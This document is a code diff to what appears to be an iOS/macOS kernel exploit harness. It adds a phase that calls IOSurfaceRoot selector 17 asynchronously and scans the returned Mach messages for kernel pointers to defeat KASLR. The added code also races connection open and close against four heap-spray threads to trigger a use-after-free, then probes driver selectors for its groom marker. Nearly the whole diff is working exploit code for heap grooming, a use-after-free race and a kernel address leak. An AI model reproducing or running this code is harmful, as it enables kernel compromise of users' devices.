@@ -17008,7 +17008,7 @@ new_modes:
             rlog("*** rounds=%d: fast-path to Phase 16 ***\n", rounds);
             goto phase15_done;
         }
-        if (rounds >= 170 && rounds <= 189) {
+        if (rounds >= 170 && rounds <= 199) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
@@ -20105,7 +20105,7 @@ new_modes:
          *   - Create VideoToolbox session, fuzz parameters for OOB read
          *   - Look for kernel pointer leaks in output buffers
          */
-        if (rounds >= 170 && rounds <= 189) {
+        if (rounds >= 170 && rounds <= 199) {
             rlog("\n--- Phase 17: IOSurface shared memory + KASLR probe ---\n");
 
             dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
@@ -21623,6 +21623,284 @@ new_modes:
                          rounds);
                 }
                 rlog("=== r=%d complete ===\n", rounds);
+            }
+
+            if (rounds == 190) {
+                /*
+                 * r=190: Mach async notification scan for KASLR leak.
+                 *
+                 * When sel17 completes asynchronously, it fires a Mach notification
+                 * on the wake port. Read the full notification message and scan every
+                 * field for kernel address patterns. Also try sel17 during UAF to see
+                 * if corrupted state leaks addresses.
+                 *
+                 * Additionally: use the UAF write to corrupt an IOSurface registry
+                 * entry, then call IOSurface property getters to read back kernel data.
+                 */
+                rlog("=== r=190: Mach async notification + UAF property leak ===\n");
+
+                /* Part A: Read the full async notification from sel17 */
+                rlog("\n  --- Part A: sel17 async notification scan ---\n");
+                for (int na = 0; na < 5; na++) {
+                    mach_port_t wp190 = MACH_PORT_NULL;
+                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp190);
+                    mach_port_insert_right(mach_task_self(), wp190, wp190,
+                        MACH_MSG_TYPE_MAKE_SEND);
+
+                    uint64_t buf190[3] = { (uint64_t)na + 1, (uint64_t)na + 100, (uint64_t)na + 200 };
+                    uint64_t ref190 = 0xAA00000000000000ULL | na;
+
+                    kern_return_t kr190 = IOConnectCallAsyncMethod(conn17, 17,
+                        wp190, &ref190, 1, NULL, 0,
+                        buf190, 24, NULL, NULL, NULL, NULL);
+                    rlog("  sel17 async call %d: kr=0x%x\n", na, kr190);
+
+                    /* Read the notification message */
+                    struct {
+                        mach_msg_header_t hdr;
+                        uint8_t body[2048];
+                    } msg190;
+                    memset(&msg190, 0, sizeof(msg190));
+                    msg190.hdr.msgh_size = sizeof(msg190);
+                    msg190.hdr.msgh_local_port = wp190;
+
+                    kern_return_t mr190 = mach_msg(&msg190.hdr,
+                        MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                        0, sizeof(msg190), wp190, 2000, MACH_PORT_NULL);
+
+                    if (mr190 == KERN_SUCCESS) {
+                        size_t total_sz = msg190.hdr.msgh_size;
+                        rlog("  Msg %d: id=0x%x size=%zu bits=0x%x rport=0x%x lport=0x%x\n",
+                             na, msg190.hdr.msgh_id,
+                             total_sz, msg190.hdr.msgh_bits,
+                             msg190.hdr.msgh_remote_port,
+                             msg190.hdr.msgh_local_port);
+
+                        /* Scan entire message for kernel pointers */
+                        uint64_t *mp = (uint64_t *)&msg190;
+                        size_t nwords = total_sz / 8;
+                        for (size_t w = 0; w < nwords; w++) {
+                            uint64_t v = mp[w];
+                            /* Strip MTE tag in bits[59:56] */
+                            uint64_t untagged = (v & 0xF000FFFFFFFFFFFFULL) |
+                                                ((v & 0x00F0000000000000ULL) ? 0xFFF0000000000000ULL : 0);
+                            if ((untagged & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                                (untagged & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                                rlog("  *** KPTR at word %zu: raw=0x%016llx untagged=0x%016llx ***\n",
+                                     w, (unsigned long long)v, (unsigned long long)untagged);
+                            }
+                            /* Also check for non-zero values that aren't obviously small integers */
+                            if (v > 0x100000 && v != ref190 && w > 2) {
+                                rlog("  word[%zu] = 0x%016llx\n", w, (unsigned long long)v);
+                            }
+                        }
+
+                        /* Hex dump of full message body */
+                        rlog("  Hex dump (first 128 bytes):\n    ");
+                        for (size_t b = 0; b < 128 && b < total_sz; b++) {
+                            rlog("%02x", ((uint8_t*)&msg190)[b]);
+                            if ((b + 1) % 32 == 0) rlog("\n    ");
+                            else if ((b + 1) % 8 == 0) rlog(" ");
+                        }
+                        rlog("\n");
+                    } else {
+                        rlog("  Msg %d: mach_msg recv failed: 0x%x (timeout=%s)\n",
+                             na, mr190, mr190 == 0x10004003 ? "yes" : "no");
+                    }
+
+                    mach_port_deallocate(mach_task_self(), wp190);
+                }
+
+                /* Part B: Trigger UAF and read back through IOSurface APIs */
+                rlog("\n  --- Part B: UAF + IOSurface property read-back ---\n");
+
+                /* Create a surface to get its ID */
+                CFMutableDictionaryRef sp190 = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                int w190 = 64, h190 = 64, bpe190 = 4;
+                CFNumberRef wn190 = CFNumberCreate(NULL, kCFNumberIntType, &w190);
+                CFNumberRef hn190 = CFNumberCreate(NULL, kCFNumberIntType, &h190);
+                CFNumberRef bn190 = CFNumberCreate(NULL, kCFNumberIntType, &bpe190);
+                int pf190 = 0x42475241;
+                CFNumberRef pfn190 = CFNumberCreate(NULL, kCFNumberIntType, &pf190);
+                CFDictionarySetValue(sp190, CFSTR("IOSurfaceWidth"), wn190);
+                CFDictionarySetValue(sp190, CFSTR("IOSurfaceHeight"), hn190);
+                CFDictionarySetValue(sp190, CFSTR("IOSurfaceBytesPerElement"), bn190);
+                CFDictionarySetValue(sp190, CFSTR("IOSurfacePixelFormat"), pfn190);
+
+                /* Open multiple connections for the race */
+                io_service_t svc190 = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching("IOSurfaceRoot"));
+                io_connect_t race_conn190 = IO_OBJECT_NULL;
+                IOServiceOpen(svc190, mach_task_self(), 0, &race_conn190);
+
+                /* Pre-open groom connections */
+                int gc190 = 128;
+                io_connect_t *gconns190 = malloc(gc190 * sizeof(io_connect_t));
+                mach_port_t *gwps190 = malloc(gc190 * sizeof(mach_port_t));
+                for (int g = 0; g < gc190; g++) {
+                    IOServiceOpen(svc190, mach_task_self(), 0, &gconns190[g]);
+                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gwps190[g]);
+                    mach_port_insert_right(mach_task_self(), gwps190[g], gwps190[g],
+                        MACH_MSG_TYPE_MAKE_SEND);
+                }
+
+                /* Groom data: slot0=0 (safe next), slot1=MARKER, slot2=0 (safe) */
+                uint64_t gdata190[3] = { 0, 0xAAAABBBBCCCCDDDDULL, 0 };
+                p16_groom_conns = gconns190;
+                p16_groom_wps = gwps190;
+                p16_groom_n = gc190;
+                p16_groom_data = gdata190;
+                p16_groom_count = 0;
+
+                /* Race: register then immediately deregister, with concurrent groom */
+                for (int attempt = 0; attempt < 10; attempt++) {
+                    io_connect_t rc = IO_OBJECT_NULL;
+                    IOServiceOpen(svc190, mach_task_self(), 0, &rc);
+                    if (rc == IO_OBJECT_NULL) continue;
+
+                    mach_port_t rwp;
+                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &rwp);
+                    mach_port_insert_right(mach_task_self(), rwp, rwp, MACH_MSG_TYPE_MAKE_SEND);
+
+                    uint64_t rbuf[3] = {1, 2, 3};
+                    uint64_t rref = 0x1122334455667788ULL;
+
+                    /* Start groom spray */
+                    p16_groom_run = 1;
+                    p16_groom_count = 0;
+                    pthread_t gths190[4];
+                    for (int t = 0; t < 4; t++)
+                        pthread_create(&gths190[t], NULL, p16_groom_spray, NULL);
+
+                    /* Register */
+                    IOConnectCallAsyncMethod(rc, 17, rwp, &rref, 1,
+                        NULL, 0, rbuf, 24, NULL, NULL, NULL, NULL);
+                    /* Immediately deregister (triggers UAF) */
+                    IOServiceClose(rc);
+
+                    usleep(1000);
+                    p16_groom_run = 0;
+                    for (int t = 0; t < 4; t++) pthread_join(gths190[t], NULL);
+
+                    rlog("  Attempt %d: groom=%llu\n", attempt,
+                         (unsigned long long)p16_groom_count);
+
+                    /* Now try to read from the groomed entry via IOSurface APIs.
+                     * IOSurface selector calls that iterate the registry might
+                     * encounter our groomed entry and return data from it. */
+
+                    /* Try various selectors with output */
+                    for (uint32_t sel = 0; sel <= 31; sel++) {
+                        uint8_t obuf[4096];
+                        memset(obuf, 0xEE, sizeof(obuf));
+                        size_t osz = sizeof(obuf);
+                        uint64_t sco[16];
+                        uint32_t scc = 16;
+                        memset(sco, 0, sizeof(sco));
+
+                        uint64_t sin[4] = {0};
+
+                        kern_return_t kr = IOConnectCallMethod(conn17, sel,
+                            sin, 1, NULL, 0, sco, &scc, obuf, &osz);
+
+                        if (kr == KERN_SUCCESS && (scc > 0 || osz > 0)) {
+                            /* Check for our marker or kernel pointers */
+                            int found_marker = 0;
+                            for (uint32_t j = 0; j < scc; j++) {
+                                if (sco[j] == 0xAAAABBBBCCCCDDDDULL) found_marker = 1;
+                                uint64_t ut = (sco[j] & 0xF000FFFFFFFFFFFFULL) |
+                                    ((sco[j] & 0x00F0000000000000ULL) ? 0xFFF0000000000000ULL : 0);
+                                if ((ut & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL) {
+                                    rlog("  *** sel%u sc[%u] KPTR: 0x%016llx ***\n",
+                                         sel, j, (unsigned long long)sco[j]);
+                                }
+                            }
+                            if (osz > 0) {
+                                uint64_t *op = (uint64_t *)obuf;
+                                for (size_t q = 0; q < osz / 8 && q < 64; q++) {
+                                    if (op[q] == 0xAAAABBBBCCCCDDDDULL) found_marker = 1;
+                                    uint64_t ut = (op[q] & 0xF000FFFFFFFFFFFFULL) |
+                                        ((op[q] & 0x00F0000000000000ULL) ? 0xFFF0000000000000ULL : 0);
+                                    if ((ut & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL) {
+                                        rlog("  *** sel%u out[%zu] KPTR: 0x%016llx ***\n",
+                                             sel, q, (unsigned long long)op[q]);
+                                    }
+                                }
+                            }
+                            if (found_marker)
+                                rlog("  *** sel%u: FOUND GROOM MARKER! ***\n", sel);
+                        }
+                    }
+
+                    mach_port_deallocate(mach_task_self(), rwp);
+                }
+
+                /* Part C: Read sel17 wakeport messages from DURING the race */
+                rlog("\n  --- Part C: sel17 wakeport during race ---\n");
+                for (int ra = 0; ra < 5; ra++) {
+                    io_connect_t rc2 = IO_OBJECT_NULL;
+                    IOServiceOpen(svc190, mach_task_self(), 0, &rc2);
+                    if (rc2 == IO_OBJECT_NULL) continue;
+
+                    mach_port_t rwp2;
+                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &rwp2);
+                    mach_port_insert_right(mach_task_self(), rwp2, rwp2, MACH_MSG_TYPE_MAKE_SEND);
+
+                    uint64_t rbuf2[3] = {1, 2, 3};
+                    uint64_t rref2 = 0xCC00000000000000ULL | ra;
+
+                    IOConnectCallAsyncMethod(rc2, 17, rwp2, &rref2, 1,
+                        NULL, 0, rbuf2, 24, NULL, NULL, NULL, NULL);
+                    IOServiceClose(rc2);
+
+                    /* Read any message that arrives */
+                    struct {
+                        mach_msg_header_t hdr;
+                        uint8_t body[2048];
+                    } rmsg;
+                    memset(&rmsg, 0, sizeof(rmsg));
+                    rmsg.hdr.msgh_size = sizeof(rmsg);
+                    rmsg.hdr.msgh_local_port = rwp2;
+
+                    kern_return_t mr = mach_msg(&rmsg.hdr,
+                        MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                        0, sizeof(rmsg), rwp2, 500, MACH_PORT_NULL);
+
+                    if (mr == KERN_SUCCESS) {
+                        rlog("  Race msg %d: id=0x%x size=%zu\n",
+                             ra, rmsg.hdr.msgh_id, (size_t)rmsg.hdr.msgh_size);
+                        uint64_t *rmp = (uint64_t *)&rmsg;
+                        size_t rnw = rmsg.hdr.msgh_size / 8;
+                        for (size_t w = 0; w < rnw; w++) {
+                            uint64_t v = rmp[w];
+                            if (v > 0x100000 && v != rref2 && w > 2) {
+                                rlog("  rword[%zu] = 0x%016llx\n", w, (unsigned long long)v);
+                            }
+                            uint64_t ut = (v & 0xF000FFFFFFFFFFFFULL) |
+                                ((v & 0x00F0000000000000ULL) ? 0xFFF0000000000000ULL : 0);
+                            if ((ut & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL) {
+                                rlog("  *** RACE KPTR word[%zu]: 0x%016llx ***\n",
+                                     w, (unsigned long long)v);
+                            }
+                        }
+                    } else {
+                        rlog("  Race msg %d: timeout\n", ra);
+                    }
+                    mach_port_deallocate(mach_task_self(), rwp2);
+                }
+
+                for (int g = 0; g < gc190; g++) {
+                    IOServiceClose(gconns190[g]);
+                    mach_port_deallocate(mach_task_self(), gwps190[g]);
+                }
+                free(gconns190);
+                free(gwps190);
+                CFRelease(sp190);
+                CFRelease(wn190); CFRelease(hn190); CFRelease(bn190); CFRelease(pfn190);
+                IOServiceClose(race_conn190);
+                IOObjectRelease(svc190);
+                rlog("=== r=190 complete ===\n");
             }
 
             IOServiceClose(conn17);
